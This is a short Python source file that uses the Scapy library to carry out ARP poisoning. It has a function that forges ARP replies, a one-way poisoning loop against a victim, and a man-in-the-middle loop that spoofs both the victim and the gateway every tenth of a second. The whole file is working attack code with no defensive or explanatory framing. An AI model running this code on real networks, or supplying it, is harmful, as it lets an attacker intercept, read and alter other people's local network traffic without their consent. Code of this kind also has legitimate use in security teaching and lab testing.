from scapy.all import *
from time import sleep

def arpPoison(macAttacker, macVictim, ipVictim, ipToSpoof, interface):
    arp = Ether() / ARP()
    arp[Ether].src = macAttacker
    arp[ARP].hwsrc = macAttacker
    arp[ARP].psrc = ipToSpoof
    arp[ARP].hwdst = macVictim
    arp[ARP].pdst = ipVictim

    sendp(arp, iface = interface, verbose=False)
    
def oneWayPoisoning(a,interface,live):
   
    print("\none-way ARP poisoning\n")

    hwA = a["attacker MAC"]
    hwV = a["victim MAC"]
    ipV = a["victim IP"]
    ipG = a["gateway IP"]

    while not live.is_set():
        arpPoison(hwA, hwV, ipV, ipG, interface)
        sleep(0.1)
    
def mimAttack(a,interface,live):

    print("\nMITM attack using ARP poisoning\n")

    hwA = a["attacker MAC"]
    hwV = a["victim MAC"]
    hwG = a["gateway MAC"]
    ipV = a["victim IP"]
    ipG = a["gateway IP"]

    while not live.is_set():
        arpPoison(hwA, hwV, ipV, ipG, interface)
        arpPoison(hwA, hwG, ipG, ipV, interface)
        sleep(0.1)
